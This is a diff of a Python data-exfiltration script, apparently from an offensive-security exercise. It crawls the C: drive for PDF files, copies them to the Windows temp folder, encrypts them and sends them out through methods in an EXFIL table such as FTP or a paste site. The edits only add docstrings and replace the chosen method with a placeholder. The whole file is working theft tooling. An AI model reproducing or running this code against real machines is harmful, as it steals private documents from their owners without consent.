@@ -20,13 +20,21 @@ EXFIL = {
     'plain_paste': plain_paste,
 }
 
+
 def find_docs(doc_type='.pdf'):
+    '''
+    Find PDF files
+    '''
     for parent, _, filenames in os.walk('c:\\'):
         for filename in [x for x in filenames if x.endswith(doc_type)]:
             document_path = os.path.join(parent, filename)
             yield document_path
 
+
 def exfiltrate(document_path, method):
+    '''
+    Main function
+    '''
     if method in ['transmit', 'plain_ftp']:
         filename = f'c:\\windows\\temp\\{os.path.basename(document_path)}'
         with open(document_path, 'rb') as f0:
@@ -43,7 +51,7 @@ def exfiltrate(document_path, method):
         contents = encrypt(contents)
         EXFIL[method](title, contents)
 
-# Execute
+
 if __name__ == '__main__':
     for fpath in find_docs():
-        exfiltrate(fpath, 'plain_paste')
+        exfiltrate(fpath, '<Choose a Exfil option from EXFIL and put it here!>')
